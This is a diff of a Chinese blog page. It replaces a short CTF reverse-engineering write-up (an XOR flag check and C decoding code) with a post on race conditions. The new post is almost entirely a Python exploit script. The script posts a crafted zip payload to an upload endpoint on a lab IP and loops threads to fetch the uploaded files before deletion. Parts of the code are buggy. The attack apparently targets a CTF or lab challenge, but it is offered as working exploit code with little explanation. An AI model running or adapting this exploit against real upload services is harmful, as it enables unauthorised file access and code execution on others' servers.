@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-8_logmein"
+  id="post-条件竞争"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -63,15 +63,15 @@
   <div class="article-inner">
      
     <div class="article-meta">
-      <a href="/2021/11/15/8_logmein/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.387Z" itemprop="datePublished">2021-11-15</time>
+      <a href="/2021/11/15/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-date">
+  <time datetime="2021-11-15T09:41:28.151Z" itemprop="datePublished">2021-11-15</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">148</span>
+            <span class="post-count">1.7k</span>
         </span>
     </span>
 
@@ -80,7 +80,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">10 分钟</span>
         </span>
     </span>
 </div>
@@ -93,23 +93,27 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>放进64ida 分析</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt; strlen(s); ++i )</span><br><span class="line">&#123;</span><br><span class="line">  if ( i &gt;= strlen(v8) )</span><br><span class="line">    sub_4007C0();</span><br><span class="line">  if ( s[i] != (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">    sub_4007C0();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  <p>import requests<br>import threading</p>
+<p>def scan():<br>    burp0_url = “<a target="_blank" rel="noopener" href="http://192.168.38.160:1007/upload.php&quot;">http://192.168.38.160:1007/upload.php&quot;</a><br>    burp0_url1 = “<a target="_blank" rel="noopener" href="http://192.168.38.160:1007/tmp/uploads/&quot;">http://192.168.38.160:1007/tmp/uploads/&quot;</a><br>    burp0_cookies = {“node”: “bWF4X2FsbG93ZWRfcGFja2V0”}<br>    burp0_headers = {“Pragma”: “no-cache”, “Cache-Control”: “no-cache”, “Upgrade-Insecure-Requests”: “1”,<br>                     “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36”,<br>                     “Origin”: “<a href="http://192.168.38.160:1007&quot;">http://192.168.38.160:1007&quot;</a>,<br>                     “Content-Type”: “multipart/form-data; boundary=—-WebKitFormBoundaryWoFwKBXGzbWzFApV”,<br>                     “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9”,<br>                     “Referer”: “<a target="_blank" rel="noopener" href="http://192.168.38.160:1007/&quot;">http://192.168.38.160:1007/&quot;</a>, “Accept-Encoding”: “gzip, deflate”,<br>                     “Accept-Language”: “zh-CN,zh;q=0.9”, “Connection”: “close”}<br>    burp0_data = “——WebKitFormBoundaryWoFwKBXGzbWzFApV\r\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;A.zip&quot;\r\nContent-Type: application/x-zip-compressed\r\n\r\nPK\x03\x04\x14\x00\x00\x00\x08\x00\xd4]mS\xedA\x00\xbb\xad\x06\x00\x00t\x12\x04\x00\x05\x00\x00\x00A.txt\xec\xd3\xc1\t\x84\x00\x10\x04\xc1\xbf<code>\x90\xe6\x9f\x84\x19\\?\x8eA\xc1\xaa\x08\x96f\xe7\xba\xf8\xe1&lt;\x9e\xbe\xe0\xe5\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\x82\x19\xf3\n\xe7!Q\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xe6\xc5?\xfcO\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10\x08f\xcc+\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\xc1\x8cy\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A \x981\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xe6\x15\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81</code>\xc6\xbc\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 \x10\xcc\x98W\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\x82\x19\xf3\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c^A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10\x08f\xcc+\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\xc1\x8cy\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A \x981\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xe6\x15\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81<code>\xc6\xbc\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 \x10\xcc\x98W\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\x82\x19\xf3\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c^A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10\x08f\xcc+\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\xc1\x8cy\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(|*\xd0\r\x00\x00\xff\xff\xec\xd3A\t\x00@\x10\xc40\xff\xaeOB\xe1</code>\x1e\x0b\x89\x84B\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x85\xc3\x81\x1e\x00\x00\x00\xff\xff\xed\xd31\r\x000\x0c\xc0\xb0R\xf9\xd3\x1d\x84\\xedeC\x88\x94\x1b\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 \x10\xac\xb1W\x98\xf7\x01PK\x01\x02\x14\x00\x14\x00\x00\x00\x08\x00\xd4]mS\xedA\x00\xbb\xad\x06\x00\x00t\x12\x04\x00\x05\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00A.txt\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xd8M\x03\x10A\xd8\xd7\x01O\xe5\xec\x13A\xd8\xd7\x01\x1b\x05?\xf2@\xd8\xd7\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00W\x00\x00\x00\xd0\x06\x00\x00\x00\x00\r\n——WebKitFormBoundaryWoFwKBXGzbWzFApV–\r\n”</p>
+<pre><code>requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+b1 = requests.get(burp0_url1 + &quot;/tmp/uploads/A.zip&quot;, headers=burp0_headers, cookies=burp0_cookies).text
+b2 = requests.get(burp0_url1 + &quot;/tmp/uploads/A.txt&quot;, headers=burp0_headers, cookies=burp0_cookies).text
+b3 = requests.get(burp0_url1 + &quot;/tmp/uploads/A.txt&quot;, headers=burp0_headers, cookies=burp0_cookies).text
+print(b1)
 
-
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s[i] != (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) </span><br></pre></td></tr></table></figure>
-
-<p>这句是关键</p>
-<p>v7 </p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwb0z3qswhj30dw0atabl.jpg" alt="image.png"></p>
-<p>小段储存 字符串反转 </p>
-<p>harambe</p>
-<p>构建c语言paylaod</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include&quot;iostream&quot;</span><br><span class="line">#include&quot;String&quot;</span><br><span class="line">int main() &#123;</span><br><span class="line">    char v8[] = &quot;:\&quot;AL_RT^L*.?+6/46&quot;;</span><br><span class="line">    char v7[] = &quot;harambe&quot;;</span><br><span class="line">    int v6 = 7;</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; strlen(v8); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        char s = (char)(*((BYTE*)&amp;v7 + i % v6) ^ v8[i]);</span><br><span class="line">        putchar(s);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+if not b1.match(&#39;.*404 Not Found&#39;, b1.text):
+    print(b1.text)
+if not b2.match(&#39;.*404 Not Found&#39;, b2.text):
+    print(b2.text)
+if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
+    print(b3.text)
+</code></pre>
+<p>def upload():<br>    try:<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)</p>
+<pre><code>except:
+    # print(&quot;0&quot;)
+    pass
+</code></pre>
+<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    while(True):<br>        upload()</p>
  
       <!-- reward -->
       
@@ -180,7 +184,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/11/15/8_logmein/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/11/15/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -191,7 +195,7 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/11/15/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-nav-link">
+      <a href="/2021/11/15/leaking/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
@@ -201,7 +205,7 @@
       </a>
     
     
-      <a href="/2021/11/15/7_simple-unpack/" class="article-nav-link">
+      <a href="/2021/11/15/8_logmein/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
         <div class="article-nav-title"></div>
       </a>
